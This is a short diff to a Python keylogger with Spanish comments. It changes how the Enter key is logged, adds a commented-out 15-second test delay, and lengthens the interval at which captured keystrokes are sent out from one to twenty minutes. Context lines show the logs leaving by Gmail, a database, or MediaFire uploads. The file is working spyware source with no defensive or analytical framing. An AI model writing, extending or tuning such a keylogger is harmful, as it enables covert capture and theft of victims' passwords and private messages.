@@ -181,7 +181,7 @@ def KeyLogger():
         switcher = {
             "Key.space": " ",               # Espacio
             "Key.backspace": "«",           # Borrar
-            "Key.enter": "\r\n",            # Salto de linea
+            "Key.enter": "\n",            # Salto de linea
             "Key.tab": "    ",              # Tabulación
             "Key.delete":" «×» ",           # Suprimir
             # Números
@@ -370,6 +370,7 @@ def SendLog():
 
     while (True):
         time.sleep(timeSend()*60) # Tiempo de espera por minutos 
+        #time.sleep(15) # Solo antigueeo 
         if VerificarConexion():
             if (GMailOrDataBase() == 0):    # Send mail
                 # Crea nombre del archivo
@@ -453,7 +454,7 @@ def GMailOrDataBase():
                 # (en las proximas actualizaciones , ambas a la vez)
 
 def timeSend(): # Tiempo de envío perzonalizado
-    return 1 #Minutos                 <= Escoja su tiempo en minutos
+    return 20 #Minutos                 <= Escoja su tiempo en minutos
 
 # ************ Zona MediaFire *************     
 # Se usará el API de Mediafire para subir el archivo reg.k(registro de teclas)
